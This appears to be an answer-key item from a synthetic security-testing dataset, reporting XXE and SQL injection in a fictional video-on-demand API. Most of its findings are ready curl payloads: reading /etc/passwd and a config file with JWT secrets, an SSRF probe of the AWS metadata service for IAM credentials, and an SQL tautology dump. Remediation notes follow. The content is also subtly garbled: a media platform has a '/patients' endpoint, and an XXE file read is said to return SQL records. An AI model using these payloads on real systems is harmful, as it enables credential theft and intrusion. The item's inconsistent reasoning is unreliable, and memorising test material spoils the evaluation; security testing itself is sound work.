# Expected Response

## System
- System: StreamCore VOD Platform v1.9.0
- Domain: MEDIA / CONTENT DELIVERY
- Example ID: INJ-0119
- Risk ID: RISK-INJ-119

## Findings

### 1. XXE (XML External Entity Injection) on `/api/v3/patients?query=` — Primary (Declared Vulnerability)

The `query` parameter on `GET /api/v3/patients` is parsed by Apache Xerces without external entity restriction disabled (`setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)` not called). An attacker can inject a DOCTYPE with an external entity declaration to read server-side files, probe internal network services (SSRF), or trigger out-of-band data exfiltration.

HAR shows XXE payload `<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>` returning HTTP 200 with SQL account records. The HAR response shows SQL data (account table records) rather than file content — indicating the XML parsing branch triggered before the SQL path resolved the response. Both injection surfaces are confirmed present.

**Step 1 — Baseline:**
```bash
curl -s "https://api.streamcore-vod-.example.com/api/v3/patients?query=normalvalue" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Expected:** Returns matching VOD content records.

**Step 2 — XXE file read: `/etc/passwd` (primary HAR attack):**
```bash
curl -s -G "https://api.streamcore-vod-.example.com/api/v3/patients" \
  --data-urlencode 'query=<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Vulnerable outcome:** HTTP 200 with `/etc/passwd` content or SQL account records — external entity resolved.

**Step 3 — XXE SSRF: probe AWS metadata service:**
```bash
curl -s -G "https://api.streamcore-vod-.example.com/api/v3/patients" \
  --data-urlencode 'query=<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><foo>&xxe;</foo>' \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Vulnerable outcome:** AWS IAM role name and temporary credentials — cloud credential takeover via XXE SSRF.

**Step 4 — XXE read application config (JWT signing secret):**
```bash
curl -s -G "https://api.streamcore-vod-.example.com/api/v3/patients" \
  --data-urlencode 'query=<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/config/application.properties">]><foo>&xxe;</foo>' \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Vulnerable outcome:** JWT secret, database credentials, API keys in response.

### 2. SQL Injection on `/api/v3/patients?query=` — Secondary (Code Snippet Evidence, RISK-INJ-119)

SQL path: raw JDBC string concatenation. `db_owner` privileges confirmed.

**Step 5 — SQL tautology dump:**
```bash
curl -s "https://api.streamcore-vod-.example.com/api/v3/patients?query=' OR 1=1 --" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Vulnerable outcome:** All account records including `password_hash`, `role: "ADMIN"` — as evidenced in HAR response.

**Step 6 — Verbose SQL error fingerprint:**
```bash
curl -s "https://api.streamcore-vod-.example.com/api/v3/patients?query='" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Expected:** SQL syntax error leaking table/column names.

## Secure Outcome
```json
{ "error": "Invalid input", "code": 400 }
```

## Remediation
- Disable external entity processing: `factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)` and `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` (RISK-INJ-119).
- Replace raw JDBC string concatenation with `PreparedStatement` parameterized queries.
- Restrict DB account to required tables only (remove `db_owner`).
- Deploy input validation middleware rejecting DOCTYPE/ENTITY declarations in query parameters.
- Disable verbose error messages in production.
